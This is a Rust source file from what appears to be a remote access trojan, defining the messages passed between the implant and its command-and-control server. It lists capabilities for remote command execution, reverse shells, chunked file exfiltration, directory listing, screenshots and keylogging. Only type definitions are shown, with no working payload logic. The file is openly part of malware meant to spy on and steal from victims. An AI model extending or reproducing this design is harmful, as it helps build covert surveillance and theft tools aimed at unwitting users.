// src/messages/rat.rs
use super::command::{CliCommand, CliResponse, ReverseShell};
use super::common::Metadata;
use super::file::{
  FileDownloadStatusData, FileNodeData, FileRequest, FileTransferChunk, FileTransferResult,
  ListDir, Screenshot,
};
use super::heartbeat::HeartbeatType;
use super::keylogger::{KeylogData, KeyloggerResponse};
use serde::{Deserialize, Serialize};

/// Messages sent from RAT to C2 server
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum R2CMessageType {
  Metadata(Metadata),
  Heartbeat(HeartbeatType),
  CommandResponse(CliResponse),
  DirList(Vec<FileNodeData>),
  FileDownloadChunk(FileTransferChunk),
  FileDownloadComplete(FileTransferResult),
  Screenshot(Screenshot),
  ReverseShellResponse(bool),
  KeylogData(KeylogData),
  KeyloggerResponse(KeyloggerResponse),
}

/// Messages sent from C2 server to RAT
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum C2RMessageType {
  CliCommand(CliCommand),
  Heartbeat(HeartbeatType),
  GetAllRats,
  GetMetadata(Vec<i32>),
  RequestFileDownload(FileRequest),
  ListDir(ListDir),
  Screenshot,
  ReverseShell(ReverseShell),
  GetDownloadedFiles,
  GetDownloadStatus(u32),
  StartKeylogger,
  StopKeylogger,
  GetKeyloggerData,
  GetKeyloggerStatus
}
